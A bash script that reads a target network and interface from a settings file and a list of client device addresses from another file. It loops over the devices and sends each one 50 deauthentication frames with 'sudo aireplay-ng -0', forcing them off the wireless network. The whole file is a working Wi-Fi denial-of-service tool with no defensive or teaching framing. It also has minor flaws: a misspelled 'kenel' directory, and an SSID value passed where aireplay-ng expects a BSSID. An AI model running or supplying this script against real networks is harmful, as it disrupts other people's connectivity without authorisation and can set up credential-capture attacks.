#!/bin/bash

# Standard paths
SCRIPTS_DIR="/winston/scripts"
KENEL_DIR="/winston/kenel"
DEVICE_OPTIONS="$KENEL_DIR/device_options"
NETWORK_SETTINGS="$KENEL_DIR/network_settings"

# Check if required files exist
if [ ! -f "$DEVICE_OPTIONS" ]; then
    echo "ERROR: Device options file not found at $DEVICE_OPTIONS"
    exit 1
fi

if [ ! -f "$NETWORK_SETTINGS" ]; then
    echo "ERROR: Network settings file not found at $NETWORK_SETTINGS"
    exit 1
fi

# Read settings
network=$(grep "ssid" "$NETWORK_SETTINGS" | awk '{print $2}')
interface=$(grep "interface" "$NETWORK_SETTINGS" | awk '{print $2}')

# Validate settings
if [ -z "$network" ] || [ -z "$interface" ]; then
    echo "ERROR: Missing required settings in $NETWORK_SETTINGS"
    exit 1
fi

# Get number of devices
lines=$(wc -l < "$DEVICE_OPTIONS")

# Process each device
for i in $(seq 1 "$lines"); do
    device=$(sed -n "${i}p" "$DEVICE_OPTIONS")
    if [ -n "$device" ]; then
        echo "Working on device $i: $device"
        sudo aireplay-ng -0 50 -a "$network" -c "$device" "$interface"
    fi
done
